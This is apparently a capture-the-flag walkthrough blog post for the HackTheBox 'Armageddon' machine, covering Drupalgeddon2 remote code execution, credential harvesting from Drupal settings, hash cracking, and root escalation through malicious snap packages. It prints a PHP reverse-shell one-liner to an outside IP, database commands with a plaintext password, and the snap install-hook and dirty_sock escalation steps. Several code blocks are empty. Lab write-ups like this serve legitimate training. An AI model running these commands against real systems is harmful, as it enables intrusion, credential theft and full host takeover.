Hi everyone, today we are going to be looking at Armageddon --`10.10.10.233`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Armageddon$ nmap -sC -sV 10.10.10.233

```

</details>


From the output shown above, we can see that the machine is a Linux machine. Looking at the output of the nmap scan, it seemed as if the `robots.txt` file contained a lot of information. After browsing to the URL I was presented with the following information:

<details>

Now that I had a list of new directories, I first browsed to the application's homepage to determine what the server was hosting:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img1.png"  style="width: 80%" />
</p>


I hadn't heard or Armageddon before so I did some quick Google searches and identified vulnerabilities within the Drupal implementation which would allow an attacker to gain Remote Code Execution (RCE) privileges to the host as shown in this advisory: <https://www.drupal.org/sa-core-2020-005>.

> Drupal 8 and 9 have a remote code execution vulnerability under certain circumstances.
> An attacker could trick an administrator into visiting a malicious site that could result in creating a carefully named directory on the file system. With this directory in place, an attacker could attempt to brute force a remote code execution vulnerability.

I searched for any PoC's and came across the following Github link: <https://github.com/dreadlocked/Drupalgeddon2>. I ran the code and retrieve a fake shell back -- the shell itself was a simple webshell as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img2.png"  style="width: 80%" />
</p>


## Lateral Movement using Apache

I now had access to the host and I checked `/etc/passwd` to view which users were active on the machine. Since I had access to the host, I did a simple `grep -R password` and found the following:

```text
sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
```

Going into the actual file, I came across the following credentials:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img3.png"  style="width: 80%" />
</p>


Since it was a webshell, I was unable to access MySQL, so I created a reverse shell using the following PHP command:

```php
php -r '$sock=fsockopen("10.10.14.157",80);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

Now that I had a proper shell, I could finally log into the MySQL database using the following command: 

```bash
mysql -u drupaluser -D drupal -p 
```

The issue that I had here was that my shell would freeze everytime that I logged in to the instance. In order to get around this issue, I used the commands directly from the shell:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; show tables;"
```

There were a large number of tables within the application, but the one that I was interested in was `users`. After identifying the correct table, I selected all the data from the table using the following command:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; select * from users\G;"
```


The `\G` flag simply displays the results vertically instead of in tabular format for easier reading. There were a few entries but the one that I was interested in is shown below:

```

Now that I had the users hash, I tried to crack it using JohnTheRipper:

```bash
vagrant@ko:~/Desktop/HackTheBox/Armageddon$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])

Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Success! As shown above, I now had new credentials which I could use to authenticate to the host: `brucetherealadmin:booboo`.


## Privilege Escalation using BruceTheRealAdmin

Since I had access to the host, I started off with doing some basic enumeration:

```bash

```

Additionally, since I knew the user's password, I ran the `sudo -l` command:


```bash
[brucetherealadmin@armageddon ~]$ sudo -l

```

<p class="imgMiddle">

</p>


I knew that the user was able to exploit `snap install` so I searched in GTFO Bins and came across the following: <https://gtfobins.github.io/gtfobins/snap/>.

The code below is meant to run commands using a specially crafted Snap package. Generate it with fpm and upload it to the target.

```bash
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n x -s dir -t snap -a all meta
```

From there, it can be exploited using the following command:

```bash
sudo snap install x_1.0_all.snap --dangerous --devmode
```

However, fpm was not installed on the host. I continued enumerating and 

```bash
[brucetherealadmin@armageddon ~]$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  16
centos  7
kernel  3.10.0-1160.6.1.el7.x86_64
```

A simple searchsploit search showed two potential "dirty_sock" exploits. Looking at the code, it contained a ShellCode function which did the following:

> The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.

So, theoretically, that should create a new user with the following credentials:
* username: dirty_sock
* password: dirty_sock

I created a `.snap` file by decoding the Shell Code using the following command:

``` 
echo -n 'SHELL_CODE' |base64 -d > evil.snap
```

From there, I simply installed the package and authenticated as the root user with the following commands:

```bash
sudo /usr/bin/snap install --dangerous --devmode /tmp/evil.snap
su dirty_sock
sudo su
```

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
